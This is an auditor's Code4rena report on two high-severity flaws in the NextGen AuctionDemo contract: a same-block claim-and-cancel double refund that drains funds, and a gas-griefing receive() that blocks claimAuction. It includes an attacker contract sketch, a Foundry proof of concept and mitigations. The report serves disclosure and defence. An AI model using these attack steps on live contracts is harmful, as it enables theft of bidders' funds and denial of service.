# What is NextGen?
NextGen is a series of contracts whose purpose is to explore:

- More experimental directions in generative art and
- Other non-art use cases of 100% on-chain NFTs

[Link to the contest](https://code4rena.com/audits/2023-10-nextgen)

# Issues found by me

| Severity | Title                                                                                        |
| :------- | :------------------------------------------------------------------------------------------- | 
| High     | A malicious bidder could drain the AuctionDemo contract if he ends up the winner of an auction | 
| High     | claimAuction() can be made very expensive to call by a malicious bidder | 

# 1. A malicious bidder could drain the AuctionDemo contract if he ends up the winner of an auction

## Impact
A malicious actor can drain the `AuctionDemo` contract if he wins the auction. The `AuctionDemo` contract is supposed to hold multiple auctions simultaneously, so there should be enough liquidity.

This would work by submitting multiple bids totaling the amount he'd like to drain, then making a bid that should win the auction, then claiming the auction AND canceling all his bids. That way, he'd have won the auction and canceled his bids twice.
## Proof of Concept
The way this would be done is:
1. The attacker starts making multiple bids from his account totaling the amount he wants to drain - he could submit 5 bids totaling 50 ETH, or 20 bids totaling 50 ETH if he doesn't want to push the price for the auction very high, doesn't matter.
This is possible as the system stores each bid separately no matter if the bidder is the same.

2. He submits a bid that would end up winning the auction
If he doesn't win the auction then this would not work but if he doesn't win the auction then all of his bids will be refunded anyway so it's risk-free for him to try.

3. He calls `claimAuction` and `cancelAllBids` at the same time resulting in him winning the auction + canceling his bids TWICE resulting in a drain of the `AuctionDemo` contract
Now, for this to be possible we'd need that `block.timestamp == minter.getAuctionEndTime(_tokenid)`. Let's assume that is the case for now and I'll explain later how we can increase the chance of this happening.

So let's assume that the attacker has a winning bid for the auction + other submitted bids for 50 ETH, and `block.timestamp == minter.getAuctionEndTime(_tokenid)`.

He'd call `claimAuction`:
```solidity
function claimAuction(uint256 _tokenid) public WinnerOrAdminRequired(_tokenid,this.claimAuction.selector){
    require(block.timestamp >= minter.getAuctionEndTime(_tokenid) && auctionClaim[_tokenid] == false && minter.getAuctionStatus(_tokenid) == true);
    auctionClaim[_tokenid] = true;
    uint256 highestBid = returnHighestBid(_tokenid);
    address ownerOfToken = IERC721(gencore).ownerOf(_tokenid);
    address highestBidder = returnHighestBidder(_tokenid);
    for (uint256 i=0; i< auctionInfoData[_tokenid].length; i ++) {
        if (auctionInfoData[_tokenid][i].bidder == highestBidder && auctionInfoData[_tokenid][i].bid == highestBid && auctionInfoData[_tokenid][i].status == true) {
            //here we transfer the NFT to the winner
            IERC721(gencore).safeTransferFrom(ownerOfToken, highestBidder, _tokenid);
            (bool success, ) = payable(owner()).call{value: highestBid}("");
            emit ClaimAuction(owner(), _tokenid, success, highestBid);
        } else if (auctionInfoData[_tokenid][i].status == true) {
            //here we refund all the bidders
            (bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}("");
            emit Refund(auctionInfoData[_tokenid][i].bidder, _tokenid, success, highestBid);
        } else {}
    }
}
```
Where he'd receive the auctioned NFT + the 50ETH bids because we refund all the bidders here.

And in the same transaction he'd call `cancelAllBids`:
```solidity
function cancelAllBids(uint256 _tokenid) public {
    //we pass this as block.timestamp == minter.getAuctionEndTime(_tokenid)
    require(block.timestamp <= minter.getAuctionEndTime(_tokenid), "Auction ended");

    for (uint256 i=0; i<auctionInfoData[_tokenid].length; i++) {
       //this just checks if msg.sender is the bidder and the bid is not refunded
        if (auctionInfoData[_tokenid][i].bidder == msg.sender && auctionInfoData[_tokenid][i].status == true) {
            //this sets the bid as refunded
            auctionInfoData[_tokenid][i].status = false;
            //here we refund the bidder
            (bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}("");
            emit CancelBid(msg.sender, _tokenid, i, success, auctionInfoData[_tokenid][i].bid);
        } else {}
    }
}
```
And he'll get his 50ETH worth of bids again + the winning bid refunded.

The total profit for the attacker is the NFT + 50ETH worth of bids.

Now, for the attack to work we need `block.timestamp == getAuctionEndTime(tokenId)` so the attacker will set up a contract with the following functions:
```solidity
//function to bid
function bid() {
auctionDemo.participateToAuction();
}
//function to claim and cancel at the same time
function claimAndCancelAll() {
auctionDemo.claimAuction();
auctionDemo.cancelAllBids();
}
//function to just claim his auction, in case the attack doesn't work
function claim() {
auctionDemo.claimAuction();
}
```

Now, when it is close to the time of the auction end, he'll start spamming hundreds of transactions from the function `claimAndCancelAll()` which would only work if `block.timestamp == getAuctionEndTime(tokenId)` because if `block.timestamp < getAuctionEndTime(tokenId)` then `claimAuction` will fail, and if `block.timestamp > getAuctionEndTime(tokenId)` then `cancelAllBids` will fail.

So he can safely spam this transaction knowing it'd only execute if `block.timestamp == getAuctionEndTime(tokenId)`. However, it is not guaranteed that `block.timestamp` will be exactly equal to `getAuctionEndTime(_tokenid)` as a block needs to be mined on this exact timestamp. So in case this doesn't work, he'd simply win the auction, claim his winning NFT, and get all of his other bids refunded legitimately.

The attack won't work every time and will probably need at least a couple of tries. But let's look at the downside risks for the attacker:
1. If he doesn't win the auction, he simply gets his bids refunded so 0 loss for him
2. If he wins the auction but the attack doesn't succeed - he simply gets the NFT and pays for it legitimately. Which if he then decides to resell will result in a small loss for him at worst.

If the attack succeeds:
He gets the NFT + whatever amount he wants to drain from the auction contract, for example, 50 ETH.

Given that the worst-case scenario for him is to just win the auction and probably buy an NFT slightly overpriced, he could try 10 or even 20 times until the attack succeeds where he'll recoup all of his losses + a lot more.

Now imagine if there's a period where there are a lot of auctions running so there's a lot of liquidity in the auction contract. This will make the attack very profitable even if it succeeds 1 time out of 20.

So given all that, I believe that a dedicated attacker has a very high chance of pulling off this attack which will result in a lot of lost funds for the protocol.
## Tools Used
Manual review
## Recommended Mitigation Steps
I'd suggest entirely removing the refunding bidders' functionality from the `claimAuction` function as it can cause other issues as well.

Instead, implement a function `claimBidBack` that let's bidders claim their losing bids after the auction has ended. Ensure that `block.timestamp > getAuctionEndTime(_tokenid)`

# 2. claimAuction() can be made very expensive to call by a malicious bidde

## Impact
A malicious bidder can practically DOS the `claimAuction` function by draining all the gas and exceeding the maximum block gas limit for Ethereum which is 30 million gas at the moment. [https://www.blocknative.com/blog/ethereum-transaction-gas-limit#3](Source).
## Proof of Concept
This is possible because the `claimAuction` function sends refunds to all of the bidders. In that case, even if just 1 of them drains all of the gas available for his call it'll make calling this function extremely expensive or DOS it altogether resulting in lost funds for all participants in the auction.
Let's take a look at the code:
```solidity
function claimAuction(uint256 _tokenid) public WinnerOrAdminRequired(_tokenid,this.claimAuction.selector){
    require(block.timestamp >= minter.getAuctionEndTime(_tokenid) && auctionClaim[_tokenid] == false && minter.getAuctionStatus(_tokenid) == true);

    auctionClaim[_tokenid] = true;
    uint256 highestBid = returnHighestBid(_tokenid);
    address ownerOfToken = IERC721(gencore).ownerOf(_tokenid);
    address highestBidder = returnHighestBidder(_tokenid);

    for (uint256 i=0; i < auctionInfoData[_tokenid].length; i++) {

        if (
            auctionInfoData[_tokenid][i].bidder == highestBidder
        &&  auctionInfoData[_tokenid][i].bid == highestBid
        &&  auctionInfoData[_tokenid][i].status == true
        ) {
            IERC721(gencore).safeTransferFrom(ownerOfToken, highestBidder, _tokenid);

            (bool success, ) = payable(owner()).call{value: highestBid}("");

            emit ClaimAuction(owner(), _tokenid, success, highestBid);
        } else if (auctionInfoData[_tokenid][i].status == true) {
            (bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}(""); <---
            emit Refund(auctionInfoData[_tokenid][i].bidder, _tokenid, success, highestBid);
        } else {}
    }
}
```
Here is a very simplified POC in Foundry. To run it, install Foundry in the project, add this file, and run `forge test --match-test testSendETH -vvv`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "../lib/forge-std/src/StdError.sol";
import "../lib/forge-std/src/Test.sol";

//contract that consumes all the gas
contract GasConsumer {

//function that adds our bid for participation in the auction
function participateToAuction() public payable {}
//receive function that consumes all the gas
receive() external payable {
    for(uint256 i = 0; i < 300000; i++) {}
}

}

//contrac that will simulate sending the payment to one of the borrowers
contract SendETH{
constructor() {}
//sendETH function simulating payment to just 1 bidder
function sendETH(address recipient, uint amount) public returns(bool success){
    (success, ) = payable(recipient).call{value: amount}("");
}
}

//test contract
contract TestSendETH is Test {
GasConsumer gasConsumer = new GasConsumer();
SendETH sendETH = new SendETH();

function testSendETH() public {
    //deal so we can have something to send
    vm.deal(address(sendETH), 1 ether);

    sendETH.sendETH(address(gasConsumer), 1);
}
}
```
Result:
```solidity
[PASS] testSendETH() (gas: 33317614)
Test result: ok. 1 passed; 0 failed; finished in 373.14ms
```
The test passes, however, that is because Foundry has a much higher gas limit than Ethereum mainnet. As you can see it spends 33 317 614 gas which is over the 30M block gas limit which means that on Ethereum mainnet the transaction will always fail.

Additionally, in the live environment, you'll process a lot more transactions because you'll have to refund all the borrowers, and the malicious GasConsumer contract could be made a lot more gas-costly as well.

This makes the `claimAuction` function extremely expensive and even if the transaction manages to pass it'll cost a lot to the one who calls the transaction(winner or protocol admin) making it unfeasible to call it.

For example, 30 000 000 gas units * 25 gwei(avg price at the time of writing) / 1 000 000 000(for a result in ETH) = 0.75ETH

Note: this is different than the bot finding because the bot finding is about unbounded array that can cause out-of-gas reverts. The issue here includes a malicious borrower and is not solved by the fix that'll fix the issue found by the bot.
## Tools Used
Manual review
## Recommended Mitigation Steps
I'd suggest implementing a function `claimRefund` callable by each borrower so they can receive their bids back. There is no reason to send the rewards to the winner and refund all the borrowers in one transaction.

